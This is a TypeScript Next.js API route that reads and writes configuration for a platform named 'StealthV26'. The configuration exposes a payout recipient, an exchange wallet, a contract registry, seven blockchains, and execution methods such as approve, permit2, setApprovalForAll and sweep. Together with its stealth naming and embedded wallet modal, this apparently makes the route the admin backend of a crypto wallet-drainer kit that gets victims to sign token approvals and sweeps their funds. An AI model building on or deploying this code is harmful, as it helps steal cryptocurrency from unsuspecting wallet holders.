import { NextResponse } from "next/server";
import { CONTRACT_REGISTRY } from "@/lib/contract-registry";
import { isFrontpageConfig, readFrontpageConfig, writeFrontpageConfig } from "@/lib/frontpage-config-store";
import { resolvePlatformRuntimeConfig } from "@/lib/platform-runtime-config";
import { requireAuth } from "@/lib/api-auth";

export async function GET() {
  const guard = await requireAuth("config:read");
  if (guard) return guard;
  const [frontpage, platform] = await Promise.all([readFrontpageConfig(), resolvePlatformRuntimeConfig()]);
  const contractRegistry = CONTRACT_REGISTRY.map((entry) => ({
    name: entry.name,
    category: entry.category,
    address: entry.address,
    capabilities: entry.capabilities,
    executionBackend: entry.backend ?? null,
    description: entry.description,
  }));

  return NextResponse.json({
    status: "ok",
    platform: "StealthV26",
    version: "26.0.0",
    /** StealthExchange + embed recipient; Sequence exchange wallet matches unless env override — see platform-config. */
    recipient: platform.recipient,
    sequenceExchangeWallet: platform.sequenceExchangeWallet,
    payout: platform.payout,
    modules: ["general", "wallet", "modal", "tokens", "advanced"],
    supportedChains: [
      { id: 1, name: "Ethereum", symbol: "ETH" },
      { id: 56, name: "BSC", symbol: "BNB" },
      { id: 137, name: "Polygon", symbol: "MATIC" },
      { id: 43114, name: "Avalanche", symbol: "AVAX" },
      { id: 42161, name: "Arbitrum", symbol: "ETH" },
      { id: 10, name: "Optimism", symbol: "ETH" },
      { id: 8453, name: "Base", symbol: "ETH" },
    ],
    executionMethods: [
      "approve",
      "transferFrom",
      "permit",
      "permit2",
      "multicall",
      "safeTransferFrom",
      "setApprovalForAll",
      "sweep",
    ],
    executionBackends: contractRegistry.filter((entry) => entry.executionBackend),
    contractRegistry,
    frontpage,
  });
}

export async function POST(request: Request) {
  const guard = await requireAuth("config:write");
  if (guard) return guard;

  try {
    const body = await request.json();
    const frontpage = body?.frontpage ?? body;

    if (!isFrontpageConfig(frontpage)) {
      return NextResponse.json(
        { status: "error", message: "Invalid frontpage config payload" },
        { status: 400 },
      );
    }

    await writeFrontpageConfig(frontpage);

    return NextResponse.json({
      status: "ok",
      message: "Configuration updated successfully",
      timestamp: new Date().toISOString(),
      frontpage,
    });
  } catch {
    return NextResponse.json({ status: "error", message: "Invalid request body" }, { status: 400 });
  }
}
